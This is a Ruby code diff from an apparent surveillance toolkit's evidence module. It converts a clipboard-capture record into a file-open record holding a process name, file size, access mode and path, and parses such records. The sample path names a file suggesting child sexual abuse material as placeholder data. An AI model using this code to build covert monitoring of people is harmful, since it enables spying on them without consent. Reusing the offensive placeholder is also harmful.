@@ -2,21 +2,22 @@ require 'rcs-common/evidence/common'
 
 module RCS
 
-module ClipboardEvidence
+module FileopenEvidence
 
   ELEM_DELIMITER = 0xABADC0DE
 
   def content
-    process = "Notepad.exe".to_utf16le_binary_null
-    window = "New Document".to_utf16le_binary_null
+    process = "Explorer.exe\0".encode("US-ASCII")
+    file = "c:\\Utenti\\pippo\\pedoporno.mpg".to_utf16le_binary_null
     content = StringIO.new
     t = Time.now.getutc
     content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
     content.write process
-    content.write window
-    content.write "1234567890".to_utf16le_binary_null
+    content.write [ 0 ].pack('L') # size hi
+    content.write [ 123456789 ].pack('L') # size lo
+    content.write [ 0x80000000 ].pack('l') # access mode
+    content.write file
     content.write [ ELEM_DELIMITER ].pack('L')
-
     content.string
   end
   
@@ -34,16 +35,22 @@ module ClipboardEvidence
       tm = stream.read 36
       @info[:acquired] = Time.gm(*tm.unpack('l*'), 0)
       @info[:process] = ''
-      @info[:window] = ''
-      @info[:clipboard] = ''
+      @info[:file] = ''
 
-      process = stream.read_utf16le_string
-      @info[:process] = process.utf16le_to_utf8 unless process.nil?
-      window = stream.read_utf16le_string
-      @info[:window] = window.utf16le_to_utf8 unless window.nil?
-      clipboard = stream.read_utf16le_string
-      @info[:clipboard] = clipboard.utf16le_to_utf8 unless clipboard.nil?
+      process_name = stream.read_ascii_string
+      @info[:process] = process_name.force_encoding('US-ASCII') unless process_name.nil?
 
+      size_hi = stream.read(4).unpack("L").first
+      size_lo = stream.read(4).unpack("L").first
+      #TODO: remove hi and lo when mongo is in place
+      @info[:size_hi] = size_hi
+      @info[:size_lo] = size_lo
+      @info[:size] = size_hi << 32 | size_lo
+      @info[:mode] = stream.read(4).unpack("l").first
+
+      file = stream.read_utf16le_string
+      @info[:file] = file.utf16le_to_utf8 unless file.nil?
+      
       delim = stream.read(4).unpack("L*").first
       raise EvidenceDeserializeError.new("Malformed evidence (missing delimiter)") unless delim == ELEM_DELIMITER
 
